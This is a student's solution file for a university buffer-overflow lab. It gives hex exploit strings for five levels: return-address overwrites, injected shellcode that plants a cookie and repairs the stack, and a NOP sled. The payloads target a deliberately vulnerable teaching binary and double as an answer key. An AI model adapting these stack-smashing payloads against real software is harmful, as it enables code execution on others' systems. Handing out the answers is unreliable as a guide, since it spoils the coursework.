/*
    Kellen Fox
    cs247
    W00961302
    buflab
*/

// 0. Candle hex solution
// Push the address of the smoke function onto the stack so that getbuf returns to smoke
01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 ba 90 04 08

// 1. Sparkler hex solution
// this time push the address of the fizz function and put it into the return value in the stack also put the cookie on the end to pass it as a variable 
01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 6f 90 04 08 00 00 00 00 e7 08 0e 63

// 2. Firecracker hex solution
// use the exploit from earlier to return to the begging of the spring. embed hex of some cool assembler.
//
// movl  $0x630e08e7, 0x0804c1ec  // Move cookie into the memory location found using info variables in gdb
// pushl $0x08049022              // Push the address of the function we want to call
// ret
c7 05 ec c1 04 08 e7 08 0e 63 68 22 90 04 08 c3 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 08 34 68 55 

// 3. Dynamite hex solution
// do the same thing as firecracker but dont screw up the stack
// 
// movl  $0x630e08e7, %eax  //put my cookie into the return register
// movl  $0x55683460, %ebp  // move the base pointer back to where it should be
// push  $0x08048c93        // push the address of the function we want to call 
// ret
b8 e7 08 0e 63 bd 60 34 68 55 68 93 8c 04 08 c3 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 08 34 68 55 

// 4. Nitro hex solution
// do the same thing as dynamite but with a highly randomized stack 
// Use a NOP 'slide' to always hit your code on the end of the exploit string
// embed nearly the same assmebler as with dynamite  except this time ive used a fancy lea to move the base pointer :D
//
//  lea 0x28 (%esp), %ebp
//  movl $0x630e08e7, %eax
//  push $0x08048c2e
//  ret
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 8d 6c 24 28 b8 e7 08 0e 63 68 2e 8c 04 08 c3
00 00 00 00 00 00 00 00 00 00 00 00 68 32 68 55
